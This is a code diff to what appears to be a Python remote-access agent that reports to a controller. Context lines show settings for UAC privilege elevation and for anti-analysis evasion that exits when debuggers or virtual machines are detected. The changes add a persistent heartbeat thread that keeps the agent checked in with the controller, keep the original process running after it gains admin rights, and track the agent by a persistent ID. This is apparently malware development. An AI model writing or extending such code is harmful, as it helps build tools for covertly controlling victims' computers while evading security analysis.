@@ -223,7 +223,7 @@ DEBUG_MODE = True  # Enable debug logging for troubleshooting
 UAC_PRIVILEGE_DEBUG = True  # Enable detailed UAC and privilege debugging
 DEPLOYMENT_COMPLETED = True  # Track deployment status to prevent repeated attempts
 RUN_MODE = 'agent'  # Track run mode: 'agent' | 'controller' | 'both'
-KEEP_ORIGINAL_PROCESS = False  # FALSE = Exit original process after getting admin (prevent duplicates)
+KEEP_ORIGINAL_PROCESS = True  # FALSE = Exit original process after getting admin (prevent duplicates)
 ENABLE_ANTI_ANALYSIS = True  # FALSE = Disabled (for testing), TRUE = Enabled (exits if debuggers/VMs detected)
 
  
@@ -1012,6 +1012,33 @@ CONNECTION_STATE = {
     'consecutive_failures': 0,
     'force_reconnect': False
 }
+
+HEARTBEAT_THREAD = None
+HEARTBEAT_INTERVAL = 30
+def start_heartbeat():
+    global HEARTBEAT_THREAD
+    agent_id = get_or_create_agent_id()
+    if HEARTBEAT_THREAD and HEARTBEAT_THREAD.is_alive():
+        return
+    def heartbeat_worker():
+        try:
+            while sio and sio.connected:
+                try:
+                    safe_emit('agent_heartbeat', {'agent_id': agent_id, 'timestamp': time.time()})
+                    time.sleep(HEARTBEAT_INTERVAL)
+                except KeyboardInterrupt:
+                    break
+                except Exception:
+                    time.sleep(5)
+                    break
+        finally:
+            HEARTBEAT_THREAD = None
+    HEARTBEAT_THREAD = threading.Thread(target=heartbeat_worker, daemon=True)
+    HEARTBEAT_THREAD.start()
+    try:
+        log_message("[OK] Heartbeat started")
+    except Exception:
+        pass
 
 # WebRTC streaming variables
 WEBRTC_ENABLED = True
@@ -9868,6 +9895,14 @@ def register_socketio_handlers():
             'timestamp': int(time.time() * 1000)
         })  # ✅ SAFE
             
+            try:
+                if CONNECTION_STATE.get('reconnect_needed') or not (globals().get('HEARTBEAT_THREAD') and HEARTBEAT_THREAD.is_alive()):
+                    start_heartbeat()
+                else:
+                    pass
+            except Exception:
+                pass
+            
             # Send success notification
             emit_system_notification('success', 'Agent Connected', f'Successfully connected to controller as agent {agent_id}')
             try:
@@ -9911,7 +9946,7 @@ def register_socketio_handlers():
     def disconnect(*args):
         global CONNECTION_STATE
         try:
-            agent_id = socket.gethostname()
+            agent_id = get_or_create_agent_id()
             log_message(f"[DISCONNECT] Agent {agent_id} lost connection to controller")
             
             # Update connection state immediately
